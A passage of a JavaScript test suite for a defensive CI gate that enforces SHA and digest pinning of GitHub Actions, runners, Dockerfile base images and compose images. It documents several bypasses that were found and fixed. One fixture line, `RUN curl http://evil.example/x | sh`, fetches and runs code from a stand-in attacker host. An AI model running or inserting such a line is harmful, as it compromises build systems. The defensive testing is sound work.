#!/usr/bin/env node
/**
 * Tests for the `ci-and-container-pinning` gate.
 *
 * Run with:  node --test scripts/supply-chain/ci-pinning.test.mjs
 *
 * Before this gate existed, `uses: actions/cache@v4` added tomorrow passed all
 * eight supply-chain gates: nothing in `scripts/supply-chain/` read
 * `.github/workflows/` or the Dockerfiles at all, and the SHA-pinning rule was
 * held by a header comment. Every test below is a negative control on a shape
 * the repository forbids in prose, plus a positive control on the real files so
 * the gate cannot pass by never matching anything.
 *
 * ## Would these fail if the behaviour broke, and how was that checked?
 *
 * Each case was checked by breaking the function it covers and watching the
 * assertion fail. The two added with the recursive-discovery fix were checked the
 * same way:
 *
 *   * `discoverContainerFiles` was reverted to a non-recursive
 *     `readdirSync(root)` and "finds a compose file in a SUBDIRECTORY" failed
 *     with `[] deepEqual [ 'deploy/example/compose.yml' ]`.
 *   * `COMPOSE_NAME` was reverted to `/^docker-compose(\..+)?\.ya?ml$/` and
 *     "finds a Compose v2 filename" failed the same way.
 *   * `REQUIRED_INTERPOLATION` was widened to `/^\$\{.*\}$/` and "REFUSES an
 *     interpolation with a tag as its default" failed.
 *
 * The discovery tests use the EXPORTED walk rather than re-implementing it. A
 * test that re-implements the walk cannot catch a walk that stopped walking,
 * which is precisely the defect being fixed: the gate's own discovery was
 * non-recursive and the previous version of this file re-implemented it, so both
 * agreed, and both were blind to `deploy/staging/compose.yml`.
 */

import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';
import {
  checkComposePinning,
  checkDockerfilePinning,
  checkWorkflowInventory,
  checkWorkflowPinning,
  collectPinnedImages,
  discoverContainerFiles,
  discoverLocalActionFiles,
  listWorkflowFiles,
  matrixValues,
  parsePinnedReference,
  parseRunsOn,
} from './ci-pinning.mjs';
import { EXPECTED_WORKFLOWS } from './denied-packages.mjs';
import { Gate, REPO_ROOT } from './lib.mjs';

function failureText(gate) {
  return gate.failures.map((f) => `${f.message} ${f.detail ?? ''}`).join('\n');
}

const WORKFLOW_DIR = join(REPO_ROOT, '.github', 'workflows');

describe('the repository as it stands', () => {
  it('passes on every real workflow', () => {
    const files = listWorkflowFiles(WORKFLOW_DIR);
    assert.ok(files.length >= 2, 'expected at least the CI and scheduled-audit workflows');
    let judged = 0;
    for (const name of files) {
      const gate = new Gate('t');
      judged += checkWorkflowPinning(gate, name, readFileSync(join(WORKFLOW_DIR, name), 'utf8'));
      assert.deepEqual(gate.failures, [], `${name}:\n${failureText(gate)}`);
    }
    // If this ever drops to zero the gate has stopped finding `uses:` lines and
    // would pass a workflow full of tags.
    assert.ok(judged > 10, `expected many action references, judged ${judged}`);
  });

  it('passes on every real Dockerfile and compose file the GATE discovers', () => {
    // Discovery comes from the gate's own exported function, not a copy of it.
    const { dockerfiles, composeFiles } = discoverContainerFiles(REPO_ROOT);
    assert.ok(dockerfiles.length >= 2, `expected both Dockerfiles, found ${dockerfiles.join(', ')}`);
    assert.ok(
      composeFiles.length >= 2,
      `expected the development and staging compose files, found ${composeFiles.join(', ')}`,
    );

    let baseImages = 0;
    for (const name of dockerfiles) {
      const gate = new Gate('t');
      baseImages += checkDockerfilePinning(gate, name, readFileSync(join(REPO_ROOT, name), 'utf8'));
      assert.deepEqual(gate.failures, [], `${name}:\n${failureText(gate)}`);
    }
    assert.ok(baseImages > 0, 'no external base image was judged — the check found nothing to check');

    let composeImages = 0;
    for (const name of composeFiles) {
      const gate = new Gate('t');
      const judged = checkComposePinning(gate, name, readFileSync(join(REPO_ROOT, name), 'utf8'));
      assert.deepEqual(gate.failures, [], `${name}:\n${failureText(gate)}`);
      assert.ok(judged > 0, `${name}: no image reference was judged`);
      composeImages += judged;
    }
    // Six today: postgres and the proxy in each compose file, plus the two
    // application images in the staging one. A floor, so that a discovery that
    // silently found one file cannot pass this.
    assert.ok(composeImages >= 6, `only ${composeImages} compose image reference(s) were judged`);
  });

  it('accepts the workflow inventory it actually has', () => {
    const gate = new Gate('t');
    checkWorkflowInventory(gate, listWorkflowFiles(WORKFLOW_DIR));
    assert.deepEqual(gate.failures, [], failureText(gate));
  });
});

describe('workflow inventory', () => {
  it('FAILS on an injected .github/workflows/codeql.yml', () => {
    // A named campaign IOC: the worm adds a workflow whose name squats on one
    // people expect, then uses it to mint publish tokens.
    const gate = new Gate('t');
    checkWorkflowInventory(gate, [...EXPECTED_WORKFLOWS, 'codeql.yml']);
    assert.match(failureText(gate), /unexpected workflow file: \.github\/workflows\/codeql\.yml/);
  });

  it('FAILS on any undeclared workflow, not just the one the campaign uses', () => {
    const gate = new Gate('t');
    checkWorkflowInventory(gate, [...EXPECTED_WORKFLOWS, 'publish.yml']);
    assert.match(failureText(gate), /unexpected workflow file: \.github\/workflows\/publish\.yml/);
  });

  it('FAILS when a declared workflow disappears', () => {
    const gate = new Gate('t');
    checkWorkflowInventory(gate, ['ci.yml']);
    assert.match(failureText(gate), /declared workflow is missing: \.github\/workflows\/release\.yml/);
  });

  it('FAILS when there are no workflows at all', () => {
    const gate = new Gate('t');
    checkWorkflowInventory(gate, []);
    assert.match(failureText(gate), /a scan of nothing proves nothing/);
  });
});

describe('action pinning', () => {
  const workflow = (steps) =>
    `name: CI\non:\n  push:\njobs:\n  build:\n    runs-on: ubuntu-24.04\n    steps:\n${steps}`;

  it('FAILS on a tag reference', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', workflow('      - uses: actions/cache@v4\n'));
    assert.match(
      failureText(gate),
      /action is not pinned to a full commit SHA at ci\.yml:8: actions\/cache@v4/,
    );
  });

  it('FAILS on a branch reference and on a short SHA', () => {
    for (const reference of ['actions/checkout@main', 'actions/checkout@3d3c42e']) {
      const gate = new Gate('t');
      checkWorkflowPinning(gate, 'ci.yml', workflow(`      - uses: ${reference}\n`));
      assert.equal(gate.failures.length, 1, `${reference} was accepted`);
    }
  });

  it('FAILS on an action with no ref at all', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', workflow('      - uses: actions/checkout\n'));
    assert.equal(gate.failures.length, 1);
  });

  it('accepts a full 40-character SHA with the version in a trailing comment', () => {
    const gate = new Gate('t');
    const judged = checkWorkflowPinning(
      gate,
      'ci.yml',
      workflow('      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n'),
    );
    assert.equal(judged, 1);
    assert.deepEqual(gate.failures, []);
  });

  it('accepts a local action and a digest-pinned container action', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'ci.yml',
      workflow(
        '      - uses: ./.github/actions/setup\n' +
          `      - uses: docker://alpine@sha256:${'a'.repeat(64)}\n`,
      ),
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('FAILS on an undigested container action', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', workflow('      - uses: docker://alpine:3.20\n'));
    assert.match(failureText(gate), /container action is not digest-pinned/);
  });

  it('does not read prose about an unpinned action as an unpinned action', () => {
    // ci.yml's own header contains `uses: actions/checkout@v7` as an example of
    // what not to write. A gate that fails on its own documentation gets deleted.
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'ci.yml',
      '# A workflow that writes `uses: actions/checkout@v7` throws that away.\njobs: {}\n',
    );
    assert.deepEqual(gate.failures, []);
  });

  it('FAILS on a service container pinned only by tag', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'ci.yml',
      'jobs:\n  a:\n    services:\n      postgres:\n        image: postgres:16\n',
    );
    assert.match(failureText(gate), /service container is not digest-pinned/);
  });

  // -------------------------------------------------------------------------
  // The job-level `container:` shorthand
  //
  // The defect: the workflow check judged `image:` lines only. GitHub documents
  // `jobs.<id>.container` as "a string or a map", and the string form writes the
  // reference straight onto the `container:` line. Negative control, run against
  // a scratch repository carrying the three declared workflows with everything
  // else correctly pinned: `container: node:22` produced NO failures and exit 0,
  // while the map form `container:` + `  image: node:22` failed correctly. The
  // job container is what every step in the job executes inside.
  // -------------------------------------------------------------------------

  it('FAILS on the job-level `container:` SHORTHAND, not just the `image:` map form', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  a:\n    runs-on: ubuntu-24.04\n    container: node:22\n');
    assert.match(failureText(gate), /job container is not digest-pinned at ci\.yml:4: node:22/);
  });

  it('FAILS on a quoted container shorthand', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  a:\n    container: "node:22"\n');
    assert.match(failureText(gate), /job container is not digest-pinned at ci\.yml:3: node:22/);
  });

  it('still FAILS on the map form, which is all it used to read', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  a:\n    container:\n      image: node:22\n');
    assert.match(failureText(gate), /service container is not digest-pinned at ci\.yml:4/);
  });

  it('accepts a digest-pinned container shorthand', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', `jobs:\n  a:\n    container: node:22@sha256:${'b'.repeat(64)}\n`);
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('does not read a job NAMED `containers` as a container declaration', () => {
    // ci.yml has a job called `containers:` and release.yml one called
    // `container-scan:`. A check that fails on its own workflow's job names gets
    // deleted, so this pins the exact-key match.
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  containers:\n    runs-on: ubuntu-24.04\n');
    assert.deepEqual(gate.failures, [], failureText(gate));
  });
});

// ---------------------------------------------------------------------------
// YAML FLOW styles, which every reader in this file was blind to
//
// The defect: `uses:`, `runs-on:`, `image:` and `container:` are all read by
// regexes anchored at `^\s*`, and YAML's flow mappings put a key anywhere on the
// line. GitHub's parser accepts both. Measured against the exported checks, one
// form per call, everything else in the workflow correctly pinned:
//
//     - uses: actions/checkout@v7                     FAIL, 1 judged
//     - {uses: actions/checkout@v7}                   pass, 0 judged
//     steps: [{uses: actions/checkout@v7}]            pass, 0 judged
//     - uses: / newline / actions/checkout@v7         pass, 0 judged
//     a: {runs-on: ubuntu-latest}                     pass, 0 declarations
//     pg: {image: postgres:16}                        pass, 0 judged
//
// And nothing said so: the counts this file returns were a note, so the run
// printed "1 workflow(s), 0 action reference(s)" and a green tick. Same class as
// `FROM node AS node` below and as the `runs-on` spellings above.
//
// `checkNothingWasUnread` refuses a line carrying one of those four keys in a
// shape the readers cannot see, rather than teaching four regexes to parse flow
// YAML. Each row below was re-run against the fixed gate: all five now fail.
// ---------------------------------------------------------------------------

describe('keys the readers cannot see', () => {
  const unread = [
    ['a step written as a flow mapping', 'jobs:\n  a:\n    steps:\n      - {uses: actions/checkout@v7}\n'],
    ['a steps list written as a flow sequence', 'jobs:\n  a:\n    steps: [{uses: actions/checkout@v7}]\n'],
    [
      'a uses whose value is on the next line',
      'jobs:\n  a:\n    steps:\n      - uses:\n          actions/checkout@v7\n',
    ],
    ['a whole job written as a flow mapping', 'jobs:\n  a: {runs-on: ubuntu-latest, steps: []}\n'],
    [
      'a service container written as a flow mapping',
      'jobs:\n  a:\n    services:\n      pg: {image: postgres:16}\n',
    ],
  ];

  for (const [what, text] of unread) {
    it(`FAILS on ${what}`, () => {
      const gate = new Gate('t');
      checkWorkflowPinning(gate, 'w.yml', text);
      assert.match(failureText(gate), /is in a shape this gate cannot read/, `${what} was accepted`);
    });
  }

  it('does not fire on the block forms every real workflow uses', () => {
    // The whole risk of this check is a false positive on the shapes the
    // repository already writes. `runCiPinningGate` over the real files is the
    // other half of this assertion and lives in the first describe block.
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'w.yml',
      'jobs:\n  a:\n    runs-on: ubuntu-24.04\n    container:\n' +
        `      image: node:22@sha256:${'a'.repeat(64)}\n` +
        '    services:\n      pg:\n' +
        `        image: postgres:16@sha256:${'b'.repeat(64)}\n` +
        '    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n',
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('does not read `Base-image digest freshness` as an image key', () => {
    // release.yml has a step by that name. A hyphen before `image` is not a YAML
    // key boundary, and a gate that fails on its own step names gets deleted.
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'release.yml',
      'jobs:\n  a:\n    steps:\n      - name: Base-image digest freshness\n',
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
  });
});

// ---------------------------------------------------------------------------
// Local actions — the two-hop bypass
//
// `checkWorkflowPinning` clears `uses: ./…` because "a local action lives in this
// repository and is reviewed with it". The gate then read `.github/workflows`
// and nothing else, so `.github/actions/setup/action.yml` containing
// `uses: actions/checkout@v7` passed the release audit having never been opened.
// ---------------------------------------------------------------------------

describe('local action files', () => {
  it('discovers an action.yml anywhere but the skipped directories', () => {
    const root = mkdtempSync(join(tmpdir(), 'prl-actions-'));
    after(() => rmSync(root, { recursive: true, force: true }));
    mkdirSync(join(root, '.github', 'actions', 'setup'), { recursive: true });
    writeFileSync(join(root, '.github', 'actions', 'setup', 'action.yml'), 'runs:\n  using: composite\n');
    mkdirSync(join(root, 'node_modules', 'someone', 'thing'), { recursive: true });
    writeFileSync(join(root, 'node_modules', 'someone', 'thing', 'action.yml'), 'runs:\n');
    assert.deepEqual(discoverLocalActionFiles(root), ['.github/actions/setup/action.yml']);
  });

  it('FAILS on an unpinned uses inside a composite action', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      '.github/actions/setup/action.yml',
      'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n',
    );
    assert.match(failureText(gate), /action is not pinned to a full commit SHA/);
  });
});

// ---------------------------------------------------------------------------
// `runs-on`, in every spelling GitHub accepts
//
// The defect: the check was `/^\s*runs-on:\s*(\S+)/` plus
// `runner.endsWith('-latest')`, which reads ONE of five forms. Measured end to
// end against a scratch repository carrying the three declared workflows with
// everything else correctly pinned, one spelling per run:
//
//     runs-on: ubuntu-latest                              FAIL, exit 1
//     runs-on: "ubuntu-latest"                            pass, exit 0
//     runs-on: / - ubuntu-latest                          pass, exit 0
//     runs-on: [ubuntu-latest]                            pass, exit 0
//     runs-on: / group: default / labels: ubuntu-latest   pass, exit 0
//     os: [ubuntu-latest] / runs-on: ${{ matrix.os }}     pass, exit 0
//
// One quote character disabled a release-blocking gate. The previous version of
// this file fed the check only the first row, which is how it survived. Every
// row is below, and each was re-run against the fixed gate: all six now exit 1.
//
// Do not "simplify" this back to a single regex.
// ---------------------------------------------------------------------------

/**
 * A GitHub Actions expression, spelled through a substitution.
 *
 * Same reason as `interpolation` further down: Biome's `noTemplateCurlyInString`
 * refuses a plain string containing this syntax and `noUnusedTemplateLiteral`
 * refuses a template literal without a substitution, so between them there is no
 * spelling for a literal `${'\u0024'}{{ … }}`. This repository has no
 * `biome-ignore` comments anywhere and a lint workaround would be a poor place
 * to add the first.
 */
const ghExpression = (body) => `\u0024{{ ${body} }}`;

describe('runner pinning, in all five spellings of runs-on', () => {
  const job = (...lines) => `name: CI\non:\n  push:\njobs:\n  build:\n${lines.join('\n')}\n`;

  const floating = [
    ['a plain scalar', job('    runs-on: ubuntu-latest')],
    ['a DOUBLE-QUOTED scalar', job('    runs-on: "ubuntu-latest"')],
    ['a SINGLE-QUOTED scalar', job("    runs-on: 'ubuntu-latest'")],
    ['a FLOW sequence', job('    runs-on: [ubuntu-latest]')],
    ['a flow sequence with a pinned label beside it', job('    runs-on: [self-hosted, ubuntu-latest]')],
    ['a BLOCK sequence', job('    runs-on:', '      - ubuntu-latest')],
    ['a runner-GROUP mapping', job('    runs-on:', '      group: default', '      labels: ubuntu-latest')],
    [
      'a runner-group mapping whose labels are a flow sequence',
      job('    runs-on:', '      group: default', '      labels: [ubuntu-latest]'),
    ],
    [
      'a runner-group mapping whose labels are a nested block sequence',
      job('    runs-on:', '      group: default', '      labels:', '        - ubuntu-latest'),
    ],
    [
      'a MATRIX expression whose values are in the same file',
      job(
        '    strategy:',
        '      matrix:',
        '        os: [ubuntu-latest, ubuntu-24.04]',
        `    runs-on: ${ghExpression('matrix.os')}`,
      ),
    ],
    [
      'a matrix expression whose values are a block sequence',
      job(
        '    strategy:',
        '      matrix:',
        '        os:',
        '          - ubuntu-latest',
        `    runs-on: ${ghExpression('matrix.os')}`,
      ),
    ],
    [
      'a matrix value that only appears in an include: entry',
      job(
        '    strategy:',
        '      matrix:',
        '        os: [ubuntu-24.04]',
        '        include:',
        '          - os: ubuntu-latest',
        `    runs-on: ${ghExpression('matrix.os')}`,
      ),
    ],
  ];

  for (const [what, text] of floating) {
    it(`FAILS on a floating runner written as ${what}`, () => {
      const gate = new Gate('t');
      checkWorkflowPinning(gate, 'ci.yml', text);
      assert.match(
        failureText(gate),
        /floating runner image at ci\.yml:\d+: ubuntu-latest/,
        `ubuntu-latest was accepted when written as ${what}:\n${text}`,
      );
    });
  }

  const pinned = [
    ['a plain scalar', job('    runs-on: ubuntu-24.04')],
    ['a quoted scalar', job('    runs-on: "ubuntu-24.04"')],
    ['a flow sequence', job('    runs-on: [self-hosted, linux, ubuntu-24.04]')],
    ['a block sequence', job('    runs-on:', '      - self-hosted', '      - ubuntu-24.04')],
    ['a runner-group mapping', job('    runs-on:', '      group: default', '      labels: ubuntu-24.04')],
    [
      'a matrix expression over pinned values only',
      job(
        '    strategy:',
        '      matrix:',
        '        os: [ubuntu-24.04, ubuntu-22.04]',
        `    runs-on: ${ghExpression('matrix.os')}`,
      ),
    ],
  ];

  for (const [what, text] of pinned) {
    it(`accepts a pinned runner written as ${what}`, () => {
      const gate = new Gate('t');
      checkWorkflowPinning(gate, 'ci.yml', text);
      assert.deepEqual(gate.failures, [], `${what}:\n${failureText(gate)}`);
    });
  }

  it('REFUSES to judge a runs-on it cannot resolve, rather than calling it pinned', () => {
    // The whole class of defect here is a gate that reads nothing and reports a
    // pass. An expression naming something outside the file makes "ubuntu-latest"
    // and "ubuntu-24.04" indistinguishable from here, so it must not read as
    // pinned. It is also reported exactly once, not once per branch.
    const unresolvable = ['inputs.runner', 'vars.RUNNER', 'matrix.undefined-key'].map(ghExpression);
    for (const expression of unresolvable) {
      const gate = new Gate('t');
      checkWorkflowPinning(gate, 'ci.yml', job(`    runs-on: ${expression}`));
      assert.equal(gate.failures.length, 1, `${expression} produced ${gate.failures.length} failure(s)`);
      assert.match(failureText(gate), /runs-on cannot be resolved to a runner label/);
    }
  });

  it('FAILS on a runs-on it parsed into no labels at all', () => {
    // A runner-group mapping with no `labels:` key: the group's membership is not
    // in this file. Judging nothing and passing is what this check was rewritten
    // to stop doing.
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', job('    runs-on:', '      group: default'));
    assert.match(failureText(gate), /runs-on names no runner label at ci\.yml:\d+/);
  });

  it('reports the line of the runs-on key, not of the label', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  a:\n    runs-on:\n      - ubuntu-latest\n');
    assert.match(failureText(gate), /floating runner image at ci\.yml:3:/);
  });

  it('does not read prose about a floating runner as a floating runner', () => {
    // release.yml's header contains the words `runs-on` in a sentence about this
    // very rule.
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'release.yml',
      '# every `runs-on: ubuntu-latest` is a release blocker\njobs: {}\n',
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('resolves the matrix even when the matrix block sits after the runs-on', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'ci.yml',
      job(
        `    runs-on: ${ghExpression('matrix.os')}`,
        '    strategy:',
        '      matrix:',
        '        os: [ubuntu-latest]',
      ),
    );
    assert.match(failureText(gate), /floating runner image/);
  });

  it('exposes the parse itself, so a spelling that stops matching is visible', () => {
    // `parseRunsOn` is exported and counted in the gate's note for the same
    // reason the discovery walk is: a parser that quietly stops matching is the
    // failure this file exists to make loud.
    const declarations = parseRunsOn('jobs:\n  a:\n    runs-on: [x, "y"]\n  b:\n    runs-on:\n      - z\n');
    assert.deepEqual(
      declarations.map((d) => [d.line, d.labels]),
      [
        [3, ['x', 'y']],
        [5, ['z']],
      ],
    );
  });

  it('collects matrix values under the key that names them', () => {
    const values = matrixValues(
      'strategy:\n  matrix:\n    os: [ubuntu-24.04]\n    node: ["22"]\n    include:\n      - os: macos-15\n',
    );
    assert.deepEqual([...(values.get('os') ?? [])].sort(), ['macos-15', 'ubuntu-24.04']);
    assert.deepEqual([...(values.get('node') ?? [])], ['22']);
  });

  it('judges every runs-on in the real workflows and finds a plausible number of them', () => {
    // A floor, so that a parser that silently stopped matching cannot pass this.
    let declarations = 0;
    for (const name of listWorkflowFiles(WORKFLOW_DIR)) {
      declarations += parseRunsOn(readFileSync(join(WORKFLOW_DIR, name), 'utf8')).length;
    }
    assert.ok(declarations >= 10, `only ${declarations} runs-on declaration(s) were parsed`);
  });
});

describe('container base images', () => {
  it('FAILS on a FROM pinned only by tag', () => {
    const gate = new Gate('t');
    checkDockerfilePinning(gate, 'Dockerfile.api', 'FROM node:24.18.0-bookworm-slim AS base\n');
    assert.match(failureText(gate), /base image is not digest-pinned at Dockerfile\.api:1/);
  });

  it('FAILS on a bare `FROM node`', () => {
    const gate = new Gate('t');
    checkDockerfilePinning(gate, 'Dockerfile.api', 'FROM node\n');
    assert.equal(gate.failures.length, 1);
  });

  it('accepts a digest-pinned FROM and every later stage reference', () => {
    const gate = new Gate('t');
    const judged = checkDockerfilePinning(
      gate,
      'Dockerfile.api',
      `FROM node:24.18.0-bookworm-slim@sha256:${'6'.repeat(64)} AS base\n` +
        'FROM base AS toolchain\n' +
        'FROM toolchain AS build\n' +
        'FROM base AS runtime\n',
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
    assert.equal(judged, 1, 'only the external base image should be judged');
  });

  it('accepts --platform before the image and still judges the image', () => {
    const gate = new Gate('t');
    checkDockerfilePinning(gate, 'Dockerfile.api', 'FROM --platform=linux/amd64 node:24-slim AS base\n');
    assert.match(failureText(gate), /base image is not digest-pinned/);
  });

  it('FAILS on a compose image pinned only by tag', () => {
    const gate = new Gate('t');
    checkComposePinning(gate, 'docker-compose.yml', 'services:\n  db:\n    image: postgres:16-bookworm\n');
    assert.match(failureText(gate), /compose image is not digest-pinned/);
  });

  // -------------------------------------------------------------------------
  // A stage named after its own image
  //
  // The defect: `stages.add(stage)` ran BEFORE the "is this an earlier stage"
  // test, so `FROM node AS node` registered `node` and then immediately matched
  // it as an internal reference to itself. Negative control, run end to end
  // against a scratch repository: a Dockerfile.api of `FROM node AS node` plus
  // `RUN curl http://evil.example/x | sh`, every other file correctly pinned —
  // the gate PASSED, exit 0. The only trace in the output was the note counting
  // one fewer external base image, and `judged` was not incremented either, so
  // no coverage counter could flag it. `docker build` resolves that FROM against
  // the registry, so the bypass shipped a genuinely unpinned image.
  //
  // The previous tests used only distinct stage names, which is why they could
  // not see it. Both orderings are asserted below: the shadowing case, and the
  // legitimate case it must not break.
  // -------------------------------------------------------------------------

  it('FAILS on `FROM node AS node` — a stage named after its own image', () => {
    const gate = new Gate('t');
    const judged = checkDockerfilePinning(
      gate,
      'Dockerfile.api',
      'FROM node AS node\nRUN curl http://evil.example/x | sh\n',
    );
    assert.equal(judged, 1, 'the external base image must be JUDGED, not absorbed as a stage reference');
    assert.match(failureText(gate), /base image is not digest-pinned at Dockerfile\.api:1: node/);
  });

  it('FAILS on the same shadowing in a later stage', () => {
    const gate = new Gate('t');
    checkDockerfilePinning(
      gate,
      'Dockerfile.api',
      `FROM node:24-slim@sha256:${'6'.repeat(64)} AS base\nFROM alpine AS alpine\n`,
    );
    assert.match(failureText(gate), /base image is not digest-pinned at Dockerfile\.api:2: alpine/);
  });

  it('still treats a genuine earlier stage as internal, including one reused twice', () => {
    const gate = new Gate('t');
    const judged = checkDockerfilePinning(
      gate,
      'Dockerfile.api',
      `FROM node:24-slim@sha256:${'6'.repeat(64)} AS base\n` +
        'FROM base AS build\n' +
        'FROM base AS runtime\n' +
        'FROM build AS test\n',
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
    assert.equal(judged, 1);
  });

  it('accepts a stage that shadows an EARLIER stage of the same name', () => {
    // `FROM node AS node` is only a bypass when `node` is not already a stage.
    // Once it is, docker resolves it to the stage, and so does this.
    const gate = new Gate('t');
    const judged = checkDockerfilePinning(
      gate,
      'Dockerfile.api',
      `FROM node@sha256:${'6'.repeat(64)} AS node\nFROM node AS node\n`,
    );
    assert.equal(judged, 1, 'the first FROM must always be judged');
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('FAILS on a Dockerfile with no FROM at all', () => {
    const gate = new Gate('t');
    checkDockerfilePinning(gate, 'Dockerfile.api', '# nothing here\nRUN true\n');
    assert.match(failureText(gate), /no FROM instruction in Dockerfile\.api/);
    assert.match(failureText(gate), /A scan of nothing proves nothing/);
  });

  it('FAILS on a FROM that names no image, and says the file judged nothing', () => {
    // Two things at once, both of them the same defect class:
    //
    //   * `image === ''` used to `continue` alongside the internal-stage case, so
    //     a line the gate could not read was indistinguishable from one it had
    //     cleared;
    //   * and the coverage tripwire fires, because the FIRST FROM in a file can
    //     never be an internal stage reference — no stage has been declared yet —
    //     so "FROM lines present, zero external base images judged" is impossible
    //     in a real Dockerfile.
    //
    // That tripwire is the guard against the `FROM node AS node` ordering defect
    // coming back, and its failure mode WAS observed rather than assumed: with
    // `stages.add()` moved back above the internal-stage test in a scratch copy,
    // `FROM node AS node` produced `Dockerfile.api declares 1 FROM line(s) and no
    // external base image` instead of the silent exit 0 it used to produce.
    const gate = new Gate('t');
    const judged = checkDockerfilePinning(gate, 'Dockerfile.api', 'FROM --platform=linux/amd64\n');
    assert.equal(judged, 0);
    assert.match(failureText(gate), /FROM names no image at Dockerfile\.api:1/);
    assert.match(failureText(gate), /declares 1 FROM line\(s\) and no external base image/);
  });
});

// ---------------------------------------------------------------------------
// Discovery
//
// The defect: `containerFiles()` did a NON-recursive `readdirSync(REPO_ROOT)`
// matching `/^Dockerfile(\..+)?$/` and `/^docker-compose(\..+)?\.ya?ml$/`. A file
// at `deploy/staging/compose.yml`, or one simply named `compose.yml`, matched
// neither — so an `image: postgres:16` in it was not judged and allowed, it was
// never read, and it passed all nine gates in silence.
// ---------------------------------------------------------------------------

const temporary = [];
after(() => {
  for (const dir of temporary) rmSync(dir, { recursive: true, force: true });
});

/** A throwaway repository laid out the way the defect requires: nested, Compose v2. */
function repoWithNestedComposeFile() {
  const root = mkdtempSync(join(tmpdir(), 'prl-pinning-'));
  temporary.push(root);
  mkdirSync(join(root, 'deploy', 'example'), { recursive: true });
  mkdirSync(join(root, 'docker'), { recursive: true });
  mkdirSync(join(root, 'node_modules', 'someone-elses-package'), { recursive: true });
  writeFileSync(join(root, 'deploy', 'example', 'compose.yml'), 'services:\n  db:\n    image: postgres:16\n');
  writeFileSync(join(root, 'docker', 'Dockerfile.tools'), 'FROM alpine:3.20\n');
  // A third-party Dockerfile inside node_modules is not this repository's to pin,
  // and walking into the store would add thousands of files to every gate run.
  writeFileSync(join(root, 'node_modules', 'someone-elses-package', 'Dockerfile'), 'FROM alpine:3.20\n');
  return root;
}

describe('container-file discovery', () => {
  it('finds a compose file in a SUBDIRECTORY, and one using the Compose v2 name', () => {
    const root = repoWithNestedComposeFile();
    const { composeFiles } = discoverContainerFiles(root);
    assert.deepEqual(
      composeFiles,
      ['deploy/example/compose.yml'],
      'a nested Compose v2 file must be discovered; the old non-recursive walk found nothing',
    );
  });

  it('finds a Dockerfile in a SUBDIRECTORY', () => {
    const { dockerfiles } = discoverContainerFiles(repoWithNestedComposeFile());
    assert.deepEqual(dockerfiles, ['docker/Dockerfile.tools']);
  });

  it('does NOT walk into node_modules', () => {
    // Otherwise every gate run judges third-party Dockerfiles this repository does
    // not own and cannot pin, and the gate becomes noise.
    const { dockerfiles } = discoverContainerFiles(repoWithNestedComposeFile());
    assert.ok(
      dockerfiles.every((path) => !path.includes('node_modules')),
      `discovery walked into node_modules: ${dockerfiles.join(', ')}`,
    );
  });

  it('FAILS on the unpinned image in that nested compose file — the whole point', () => {
    const root = repoWithNestedComposeFile();
    const { composeFiles } = discoverContainerFiles(root);
    assert.equal(composeFiles.length, 1, 'the negative control needs the file to be discovered first');
    const gate = new Gate('t');
    const judged = checkComposePinning(
      gate,
      composeFiles[0],
      readFileSync(join(root, composeFiles[0]), 'utf8'),
    );
    assert.equal(judged, 1, 'the image line must be judged, not skipped');
    assert.match(failureText(gate), /compose image is not digest-pinned at deploy\/example\/compose\.yml:3/);
  });

  it('finds the SUFFIX naming convention, `api.Dockerfile`', () => {
    // `DOCKERFILE_NAME` was anchored at the front (`/^Dockerfile(\..+)?$/`), so
    // the other half of the convention matched nothing and was never opened.
    // Measured: `discoverContainerFiles` on a scratch repo containing both
    // returned only `["Dockerfile.api"]`, and the `FROM node` in
    // `api.Dockerfile` passed the gate at exit 0.
    const root = mkdtempSync(join(tmpdir(), 'prl-pinning-'));
    temporary.push(root);
    writeFileSync(join(root, 'api.Dockerfile'), 'FROM node\n');
    const { dockerfiles } = discoverContainerFiles(root);
    assert.deepEqual(dockerfiles, ['api.Dockerfile']);
    const gate = new Gate('t');
    checkDockerfilePinning(gate, dockerfiles[0], readFileSync(join(root, dockerfiles[0]), 'utf8'));
    assert.match(failureText(gate), /base image is not digest-pinned at api\.Dockerfile:1: node/);
  });

  it('FAILS on the unpinned FROM in that nested Dockerfile', () => {
    const root = repoWithNestedComposeFile();
    const { dockerfiles } = discoverContainerFiles(root);
    const gate = new Gate('t');
    checkDockerfilePinning(gate, dockerfiles[0], readFileSync(join(root, dockerfiles[0]), 'utf8'));
